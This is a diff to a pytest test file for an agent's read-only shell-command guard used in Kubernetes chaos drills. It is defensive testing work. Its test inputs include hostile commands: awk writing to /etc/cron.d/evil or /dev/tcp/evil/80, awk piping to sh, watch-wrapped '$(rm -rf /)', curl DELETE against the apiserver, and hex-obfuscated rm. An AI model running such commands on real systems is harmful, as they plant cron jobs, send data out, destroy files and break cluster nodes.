@@ -20,11 +20,18 @@ Every table entry that can execute a command or write a file is pinned here:
     carries no shell metacharacter, so the string-level screens are blind to
     it), ``-delete`` removes trees, ``-fprint*``/``-fls`` write files.
   - ``awk``   — a programming language: ``system(...)`` executes,
-    ``-f``/``-i``/``@load`` load program files. In a kubectl-exec inner command
-    this also HID an escape primitive from the argv[0] scan
-    (``awk 'BEGIN{system("nsenter …")}'`` was judged read-only).
+    ``-f``/``-i``/``-E``/``@load`` load program files, and in-program
+    redirects/pipes (``print > file``, ``print | cmd``, ``cmd | getline``)
+    write files or run commands — judged by CONSTRUCT at argv level
+    (``TestAwkProgramStringMerit``), not by the raw-string metachar screens.
+    In a kubectl-exec inner command this also HID an escape primitive from
+    the argv[0] scan (``awk 'BEGIN{system("nsenter …")}'`` was judged
+    read-only).
   - ``curl``  — ``-o``/``-O`` write local files, ``-d``/``-F``/``-T`` move host
-    data off-box.
+    data off-box, and ``-X``/``--request`` names the HTTP METHOD: against a
+    REST endpoint (the apiserver is a drill target) DELETE/POST/PUT/PATCH
+    mutate the remote side with zero local footprint, so only the
+    idempotent verbs GET/HEAD/OPTIONS stay read-only.
   - ``wget``  — its DEFAULT writes the response to a cwd file, so the verdict is
     inverted: read-only only for ``--spider`` or output sent to stdout.
   - ``ip``    — ``netns exec`` runs an arbitrary command inside a namespace.
@@ -33,6 +40,8 @@ Every table entry that can execute a command or write a file is pinned here:
   - ``sort`` / ``sar`` — ``-o`` truncates and writes an arbitrary path.
   - ``ss``    — ``-K``/``--kill`` force-closes live sockets: a fault injection.
   - ``uniq``  — its SECOND positional is an output file.
+  - ``hostname`` — a POSITIONAL argument (or ``-F``) SETS the host name, which
+    breaks kubelet identity on a drill node; only bare + read flags probe.
   - ``dmesg`` — pre-existing guard, fixed here for the bundled ``-cT`` form.
 
 Short options need care in three directions, each of which produced a real
@@ -57,8 +66,11 @@ binary-existence probe, and the skill cases probe services with
 ``curl --connect-timeout 5 <url>`` and ``wget -qO- --timeout=5 <url>``.
 """
 
+import shlex
+
 import pytest
 
+from chaos_agent.tools import readonly
 from chaos_agent.tools.readonly import (
     contains_shell_metachar,
     host_command_rejection_reason,
@@ -79,6 +91,7 @@ class TestFindActionPrimitives:
         "find /var/log -name '*.log' -delete",
         "find / -fls /tmp/out",
         "find / -fprint /tmp/out",
+        "find / -fprint0 /tmp/out",
         "find /x -fprintf /tmp/out %p",
     ])
     def test_action_primitives_rejected(self, cmd):
@@ -129,28 +142,117 @@ class TestAwkIsALanguage:
     def test_filtering_still_readonly(self, cmd):
         assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
 
-    def test_comparison_operator_rejected_by_metachar_screen(self):
-        """Pre-existing limitation, pinned so it is not mistaken for a bug.
+    def test_comparison_operator_allowed(self):
+        """P1 false-positive fix, flipped per adjudication C-01.
 
-        A comparison inside an awk program (``NR>1``) is indistinguishable from
-        a redirect at the raw-string level, so the metachar screen rejects it.
-        The screen predates the argument-level guards and is deliberately
-        conservative: the quoting layer would deliver ``>`` as a literal
-        anyway. Equivalent programs without ``>``/``<`` are accepted.
+        A comparison inside an awk program (``NR>1``) is indistinguishable
+        from a redirect at the raw-string level — which is why the deleted
+        legacy screen rejected it. The facts engine parses the quoting layer
+        and the awk construct: a quoted program carrying only a comparison is
+        a literal argument and is allowed. Docs: adjudication C-01 in
+        docs/design/bash-structural-guard-diff-adjudication.md.
         """
-        assert not is_readonly_host_command("awk 'NR>1{print $1}' /etc/passwd")
+        cmd = "awk 'NR>1{print $1}' /etc/passwd"
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
         assert is_readonly_host_command("awk 'NR!=1{print $1}' /etc/passwd")
 
-    def test_in_program_redirect_rejected_by_metachar_screen(self):
-        """``print > file`` is a write the ARGV classifier cannot see.
+    def test_in_program_redirect_rejected(self):
+        """The raw-string judge ALSO catches ``print > file`` — redundantly.
 
-        The ``>`` lives inside the program string, so no argv-level rule
-        applies; the raw-string metachar screen every call surface applies is
-        what catches it. Asserted here so the division of labour stays pinned.
+        The argv classifier judges the program string by construct
+        (``TestAwkProgramStringMerit``); this pins that the whole command is
+        refused with the precise in-program reason (adjudication: no diff —
+        same-direction agreement under both engines before the flip).
         """
         cmd = 'awk \'{print > "/etc/cron.d/evil"}\' /tmp/x'
-        assert contains_shell_metachar(cmd)
+        reason = host_command_rejection_reason(cmd)
+        assert reason is not None
+        assert "in-program output redirect" in reason
         assert not is_readonly_host_command(cmd)
+        # Duty split: the quoted ``>`` carries no SHELL structure, so the
+        # metachar screen is clean; the in-program write is caught by the
+        # awk construct guard at argv level (reason above).
+        assert not contains_shell_metachar(cmd)
+
+
+class TestAwkProgramStringMerit:
+    """The in-program awk guard judges by construct, not by character.
+
+    Only two constructs inside an awk program make it non-read-only: an
+    output redirect (``print > file`` — writes) and a command pipe
+    (``print | cmd`` / ``cmd | getline`` / ``|&`` — executes). Everything
+    the legacy raw-string screens used to reject alongside is read-only and
+    is allowed AT ARGV LEVEL: comparisons, string/regex content, comments,
+    logical ``||``, ``-F'|'`` separators, and ``getline < file`` (a READ,
+    the same capability ``cat`` has on the allowlist). These allow-cases
+    were pinned at argv level only because the whole-command surfaces ran
+    the legacy raw-string screen at the time (it rejected every quoted
+    program wholesale); since the flip the whole-command surfaces hand the
+    quoted program to this same construct guard — the C-01 flip is pinned
+    whole-command in ``test_comparison_operator_allowed``.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        'awk \'{print > "/etc/cron.d/evil"}\' /tmp/x',
+        'awk \'{print >> "/tmp/x"}\' /tmp/y',
+        'awk \'{printf "%s", $1 > "/tmp/x"}\' /etc/passwd',
+        'awk \'{print $1 > fn}\' /tmp/y',          # bareword target
+        'awk \'{print (a) > "f"}\' /tmp/x',         # parens closed BEFORE the >
+        'awk \'{print | "sh"}\' /tmp/x',
+        'awk \'{print $1 |& "coproc"}\' /tmp/x',    # gawk coproc write
+        'awk \'{"id" | getline v; print v}\'',
+        'awk \'BEGIN{"id" |& getline v}\'',         # coproc read
+        "awk '{print $1 > \"/dev/tcp/evil/80\"}'",   # gawk /dev/tcp write
+        "awk -e '{print > \"/tmp/x\"}'",             # gawk -e carries program text
+        "awk --source='{print > \"/tmp/x\"}'",
+        "awk -e'{print > \"/tmp/x\"}'",              # attached -e<program>
+        "awk -- '-1{print > \"/tmp/x\"}'",           # options-end marker
+        "awk -E /tmp/evil.awk /etc/passwd",         # gawk --exec ≈ -f
+        "awk --exec /tmp/evil.awk /etc/passwd",
+        "awk -E/tmp/evil.awk /etc/passwd",
+    ])
+    def test_in_program_write_and_pipe_rejected_at_argv_level(self, cmd):
+        argv = shlex.split(cmd)
+        assert not is_readonly_argv(argv), cmd
+        # whole-command surfaces agree: since the flip the facts judge
+        # hands the quoted program string to this same construct guard
+        # (or the flag guard sees -E/--exec)
+        assert not is_readonly_host_command(cmd), cmd
+
+    def test_line_continuation_keeps_the_statement_open(self):
+        """``print $1 \\\n> "f"`` is ONE print statement with a redirect."""
+        argv = ["awk", '{print $1 \\\n> "/tmp/x"}']
+        assert not is_readonly_argv(argv)
+
+    @pytest.mark.parametrize("cmd", [
+        "awk 'NR>1{print $1}' /etc/passwd",            # comparison pattern (P1)
+        "awk 'NR!=1{print $1}' /etc/passwd",
+        "awk '{print (a>b)}' /tmp/x",                  # parenthesized comparison
+        'awk \'{print "a>b"}\' /tmp/x',                # string content
+        'awk \'{print "a|b"}\' /tmp/x',
+        "awk '/error|fail/ {print $0}' /var/log/syslog",  # regex alternation
+        "awk '{print ($0 ~ /a|b/)}' /tmp/x",
+        "awk '{sub(/a|b/, \"x\"); print}' /tmp/x",     # regex arg to sub()
+        "awk 'NR==1 || NR>5 {print}' /tmp/x",          # logical OR pattern
+        "awk '{if (a && b) print $1}' /tmp/x",
+        "awk -F'|' '{print $1}' /tmp/x",               # pipe as field separator
+        "awk -F ' | ' '{print $2}' /tmp/x",
+        "awk '{getline line < \"/etc/hostname\"; print line}'",   # a READ, like cat
+        "awk '{while ((getline line < \"/etc/hosts\") > 0) print line}'",
+        "awk '{x = a > b} END{print x}' /tmp/x",       # comparison w/o print anchor
+        "awk '{print $1 / 2}' /tmp/x",                 # division is not regex
+        "awk -v n=5 '{print n, $0}' /etc/hostname",
+    ])
+    def test_readonly_program_forms_allowed_at_argv_level(self, cmd):
+        assert is_readonly_argv(shlex.split(cmd)), cmd
+
+    def test_comment_content_is_not_a_construct(self):
+        argv = ["awk", "{print $1 # trailing comment with | and >\n}"]
+        assert is_readonly_argv(argv)
+
+    def test_unbalanced_program_fails_closed(self):
+        assert not is_readonly_argv(["awk", '{print "abc}'])
+        assert not is_readonly_argv(["awk", "/unterminated {print}"])
 
 
 class TestCurlOutputAndUpload:
@@ -215,7 +317,6 @@ class TestCurlOutputAndUpload:
 
     @pytest.mark.parametrize("cmd", [
         "curl -XGET http://svc/",       # 'T' belongs to the method, not a flag
-        "curl -XPOST http://svc/",
         "curl -Hdata:x http://svc/",    # 'd' belongs to the header value
         "curl -u user:pw http://svc/",
         "curl -A curl/8 http://svc/",
@@ -239,6 +340,33 @@ class TestCurlOutputAndUpload:
     ])
     def test_bundled_write_flag_still_caught(self, cmd):
         assert not is_readonly_host_command(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", [
+        # The drill target is often a REST endpoint (the apiserver itself):
+        # these mutate the REMOTE side with zero local footprint, which the
+        # write/upload scan cannot see.
+        "curl -k -X DELETE https://kubernetes.default.svc/api/v1/namespaces/default/pods/victim",
+        "curl -XPOST http://127.0.0.1:8080/api/v1/namespaces/default/pods",
+        "curl -X PUT http://svc/api",
+        "curl --request PUT http://svc/api",
+        "curl --request=DELETE http://svc/api",
+        "curl -sXDELETE http://svc/api",           # verb attached to a cluster
+        "curl -sX PATCH http://svc/api",           # verb rides the next token
+        "curl -X",                                 # missing verb fails closed
+    ])
+    def test_mutating_verbs_rejected(self, cmd):
+        assert not is_readonly_host_command(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", [
+        "curl -X GET http://svc/",
+        "curl --request HEAD http://svc/",
+        "curl --request=GET http://svc/",
+        "curl -sXGET http://svc/",                 # idempotent verb in a cluster
+        "curl -sX GET http://svc/",                # idempotent verb, next token
+        "curl http://svc/XPOST/list",              # an X in a PATH is not a flag
+    ])
+    def test_idempotent_verbs_still_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
 
 
 class TestWgetWritesByDefault:
@@ -444,6 +572,38 @@ class TestMountAll:
 
     @pytest.mark.parametrize("cmd", ["mount", "mount -l", "mount -v", "mount -r"])
     def test_listing_still_readonly(self, cmd):
+        assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
+
+
+class TestHostnamePositionalSets:
+    """``hostname <name>`` is the SET form — same mutation class as ``date -s``.
+
+    On a drill node it silently breaks kubelet identity/registration while
+    every wrapper (timeout/env/nice/watch) keeps the guard applied, so the
+    positional must be refused in all of them.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        "hostname evil-drill-node",
+        "timeout 5 hostname evil-drill-node",
+        "env hostname evil-drill-node",
+        "nice -n 5 hostname evil-drill-node",
+        "watch hostname evil-drill-node",
+        "hostname -F /tmp/name",        # sets from file
+        "hostname --file /tmp/name",
+    ])
+    def test_set_forms_rejected(self, cmd):
+        assert not is_readonly_host_command(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", [
+        "hostname",
+        "hostname -f",
+        "hostname -s",
+        "hostname -d",
+        "hostname -i",
+        "hostname -V",
+    ])
+    def test_read_forms_still_readonly(self, cmd):
         assert is_readonly_host_command(cmd), host_command_rejection_reason(cmd)
 
 
@@ -1029,3 +1189,232 @@ class TestExtendedDualUseGuards:
         assert is_readonly_argv(["watch", "--interval", "2", "ss", "-tlnp"])
         assert not is_readonly_argv(["watch", "rm", "-rf", "/data/x"])
 
+
+class TestFactsEngineAdversarial54:
+    """Design doc 5.4 adversarial cases on the facts judge (the ONLY
+    engine since the flip): verdict direction AND reason category, both
+    surfaces."""
+
+    def test_arith_wrapping_subst_refused(self):
+        reason = host_command_rejection_reason("echo $(( $(id) ))")
+        assert reason is not None and "arithmetic expansion" in reason
+
+    def test_spliced_quote_subst_refused(self):
+        reason = host_command_rejection_reason('echo "$(id)"x')
+        assert reason is not None and "command substitution" in reason
+
+    def test_process_subst_refused(self):
+        reason = host_command_rejection_reason("cat <(ls)")
+        assert reason is not None and "process substitution" in reason
+
+    def test_heredoc_refused_as_redirect(self):
+        reason = host_command_rejection_reason("cat <<'EOF'\n$(id)\nEOF")
+        assert reason is not None and "redirect" in reason
+
+    def test_deep_nesting_budget_refused(self):
+        deep = "df"
+        for _ in range(65):
+            deep = f"echo $({deep})"
+        reason = host_command_rejection_reason(deep)
+        assert reason is not None and "nesting budget" in reason
+
+    def test_internal_error_reported_truthfully(self, monkeypatch):
+        """A crash inside the facts engine fails closed and says INTERNAL
+        ERROR — never disguised as the command's syntax problem (4.5)."""
+        monkeypatch.setattr(
+            "chaos_agent.tools._readonly_facts.parse_script",
+            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
+        )
+        reason = host_command_rejection_reason("cat $(id)")
+        assert reason is not None
+        assert "internal error" in reason
+        assert "unknown_syntax" not in reason
+        assert readonly.contains_shell_metachar("cat $(id)") is True
+
+    def test_ansi_c_literal_argument_allowed(self):
+        """$'\\x3b' decodes to a quoted LITERAL ';' — an argv argument, no
+        structure; refusing it is the second-kind false positive (5.4)."""
+        assert host_command_rejection_reason("echo $'\\x3b'") is None
+
+    def test_ansi_c_splice_allowlisted_binary_allowed(self):
+        """c$'\\x61't decodes to ``cat`` — allowlisted (adjudication C-06)."""
+        assert host_command_rejection_reason("c$'\\x61't /etc/passwd") is None
+
+    def test_ansi_c_splice_dangerous_binary_refused(self):
+        """$'\\x72\\x6d' decodes to ``rm`` — NOT allowlisted; the decoded
+        binary is judged, not the obfuscation."""
+        reason = host_command_rejection_reason("$'\\x72\\x6d' -rf /tmp/x")
+        assert reason is not None and "'rm'" in reason
+
+    def test_watch_quoted_subst_refused_via_reparse(self):
+        """P2/5.4: watch re-runs its argv through sh -c — outer quotes do not
+        reach it, so the 'literal' $( ) REALLY executes (adjudication 5-C)."""
+        reason = host_command_rejection_reason("watch echo '$(rm -rf /)'")
+        assert reason is not None and "sh -c" in reason
+        v_reason = readonly.kubectl_exec_rejection_reason(
+            "mypod -- watch echo '$(rm -rf /)'"
+        )
+        assert v_reason is not None and "sh -c" in v_reason
+
+    def test_env_valueless_flag_cannot_hide_watch(self):
+        """Defect E: ``-i`` is valueless for env, so it must NOT swallow the
+        ``watch`` token — the payload still reaches watch's sh -c re-parse.
+        A shared over-approximating flag table let this shape fail open on
+        all three surfaces (legacy caught it via the substring screen)."""
+        cmd = "env -i watch echo '$(rm -rf /)'"
+        reason = host_command_rejection_reason(cmd)
+        assert reason is not None and "sh -c" in reason
+        v_reason = readonly.kubectl_exec_rejection_reason(f"mypod -- {cmd}")
+        assert v_reason is not None and "sh -c" in v_reason
+        assert contains_shell_metachar(cmd)
+        # Chained variant: an exec-style wrapper in front of env.
+        assert (
+            host_command_rejection_reason("timeout 5 env -i watch echo '$(id)'")
+            is not None
+        )
+
+    def test_env_valueless_flag_clean_watch_payload_allowed(self):
+        """The same ``env -i`` boundary with a clean payload stays allowed —
+        the per-binary flag table fixes the walk, not the verdict width."""
+        assert host_command_rejection_reason("env -i watch df -h") is None
+
+    def test_env_split_string_fails_closed(self):
+        """``env -S``'s value is itself a command line; the watch walk does
+        not model split-string, so the opaque head must refuse (fail-closed)
+        rather than guess at a payload boundary."""
+        assert host_command_rejection_reason("env -S 'watch echo $(id)'") is not None
+
+    def test_deep_wrapper_chain_cannot_hide_watch(self):
+        """Defect F: a capped watch walk returning None has NOT proven
+        watch's absence — the argv classifier keeps stripping past the cap.
+        Watch at wrapper layer 4 must still be seen (the walk is uncapped;
+        its None is a proof of absence)."""
+        cmd = "timeout 5 timeout 5 timeout 5 watch echo '$(rm -rf /)'"
+        reason = host_command_rejection_reason(cmd)
+        assert reason is not None and "sh -c" in reason
+        v_reason = readonly.kubectl_exec_rejection_reason(f"mypod -- {cmd}")
+        assert v_reason is not None and "sh -c" in v_reason
+        assert contains_shell_metachar(cmd)
+
+    def test_deep_wrapper_chain_clean_watch_payload_allowed(self):
+        """Same deep chain with a clean payload stays allowed — the uncapped
+        walk widens DETECTION, not the denial surface."""
+        cmd = "timeout 5 timeout 5 timeout 5 watch df -h"
+        assert host_command_rejection_reason(cmd) is None
+
+    def test_watch_in_pipeline_tail_stage_refused(self):
+        """Defect G: watch re-runs its argv through sh -c no matter which
+        pipeline stage it heads — tail stages must get the same re-parse
+        check as the head stage."""
+        v_reason = readonly.kubectl_exec_rejection_reason(
+            "mypod -- df -h | watch echo '$(id)'"
+        )
+        assert v_reason is not None and "sh -c" in v_reason
+
+    def test_watch_in_pipeline_tail_stage_clean_allowed(self):
+        """Clean payload in a tail-stage watch stays allowed (control)."""
+        v_args = "mypod -- df -h | watch -n 1 cat /etc/hostname"
+        assert readonly.kubectl_exec_rejection_reason(v_args) is None
+
+    def test_watch_assignment_rhs_subst_refused(self):
+        """Defect H: watch does not parse VAR=VAL — it joins the word into
+        the sh -c string, where a substitution in the assignment RHS REALLY
+        executes (bash-proven). The ``=`` skip is env-only now."""
+        cmd = "watch 'A=$(id)' df -h"
+        reason = host_command_rejection_reason(cmd)
+        assert reason is not None and "sh -c" in reason
+        v_reason = readonly.kubectl_exec_rejection_reason(f"mypod -- {cmd}")
+        assert v_reason is not None and "sh -c" in v_reason
+        assert contains_shell_metachar(cmd)
+
+    def test_watch_literal_assignment_surface_split(self):
+        """A structure-free assignment through watch is read-only on the wire
+        (sh -c runs ``A=1 df``), so the host fast path allows it; the exec
+        surface re-parses the payload and fail-closed refuses the unknown
+        ``A=1`` head — a registered tightening (bashfacts does not model
+        assignment prefixes on either engine's plain path)."""
+        assert host_command_rejection_reason("watch A=1 df -h") is None
+        assert readonly.kubectl_exec_rejection_reason(
+            "mypod -- watch A=1 df -h"
+        ) is not None
+        # An assignment can never LANDLE a dangerous payload past the guard:
+        assert host_command_rejection_reason("watch A=1 rm -rf /tmp/x") is not None
+
+    def test_exec_style_wrapper_quoted_subst_allowed(self):
+        """timeout delivers argv VERBATIM (no re-parse): the quoted $( ) is
+        a literal echo argument — harmless, allowed (F-Q family)."""
+        assert host_command_rejection_reason("timeout 5 echo '$(id)'") is None
+
+    def test_watch_clean_payload_allowed(self):
+        assert host_command_rejection_reason("watch -n 1 df -h") is None
+
+    def test_awk_bidirectional(self):
+        """5.4's interpreter-program bidirectional pair + the P1 allow case."""
+        w = host_command_rejection_reason("awk '{print > \"/etc/cron.d/evil\"}' /tmp/x")
+        assert w is not None and "in-program output redirect" in w
+        p = host_command_rejection_reason("awk '{print | \"sh\"}' /tmp/x")
+        assert p is not None and "in-program command pipe" in p
+        assert host_command_rejection_reason("awk 'NR>1{print $1}' /etc/passwd") is None
+
+    def test_escaped_backticks_are_literals(self):
+        """\\`id\\` — escaped backticks do NOT substitute (C-03)."""
+        assert host_command_rejection_reason("echo \\`id\\`") is None
+
+    def test_real_subst_still_refused_exec_surface(self):
+        reason = readonly.kubectl_exec_rejection_reason("mypod -- echo $(id)")
+        assert reason is not None and "command substitution" in reason
+
+
+class TestRawStringSurfacesFacts:
+    """The raw-string surfaces run on the bashfacts structural judge — the
+    ONLY engine since the flip deleted the CHAOS_GUARD_READONLY_ENGINE switch
+    and the legacy chain. P1 verdict pins plus the real-structure refusals
+    that must survive the flip."""
+
+    P1_HOST = "awk 'NR>1{print $1}' /etc/passwd"
+
+    def test_p1_host_command_allowed(self):
+        assert readonly.host_command_rejection_reason(self.P1_HOST) is None
+        assert readonly.is_readonly_host_command(self.P1_HOST)
+        assert not readonly.contains_shell_metachar(self.P1_HOST)
+
+    def test_p1_exec_inner_allowed(self):
+        v_args = "mypod -- awk 'NR>1{print $1}' /etc/passwd"
+        assert readonly.kubectl_exec_rejection_reason(v_args) is None
+        assert readonly.is_readonly_kubectl_exec(v_args)
+
+    def test_real_structure_still_refused(self):
+        assert readonly.host_command_rejection_reason("cat > /tmp/x") is not None
+        assert readonly.contains_shell_metachar("cat /etc/passwd | grep root")
+        assert not readonly.is_readonly_kubectl_exec("mypod -- echo $(id)")
+        # The awk in-program guard lives at argv level: it fires with the
+        # precise construct reason.
+        reason = readonly.host_command_rejection_reason(
+            "awk '{print > \"/tmp/x\"}' /tmp/y"
+        )
+        assert reason is not None and "in-program output redirect" in reason
+
+
+class TestFactsReasonCarriesOffset:
+    """Design 4.7: readonly-surface reasons name the exact position of the
+    rejected structure (the issue path already did; structural parts — the
+    substitution / redirect constructs — now carry ``at pos N`` too)."""
+
+    def test_command_substitution_reason_has_pos(self):
+        reason = readonly.host_command_rejection_reason("cat $(id)")
+        assert reason is not None
+        assert "command substitution" in reason
+        assert " at pos " in reason
+
+    def test_redirect_reason_has_pos(self):
+        cmd = "cat /etc/passwd > /tmp/x"
+        reason = readonly.host_command_rejection_reason(cmd)
+        assert reason is not None
+        assert "shell redirect" in reason
+        # The offset indexes the displayed command string itself.
+        assert f"at pos {cmd.index('>')}" in reason
+
+    def test_exec_inner_substitution_reason_has_pos(self):
+        reason = readonly.kubectl_exec_rejection_reason("mypod -- echo $(id)")
+        assert reason is not None
+        assert " at pos " in reason
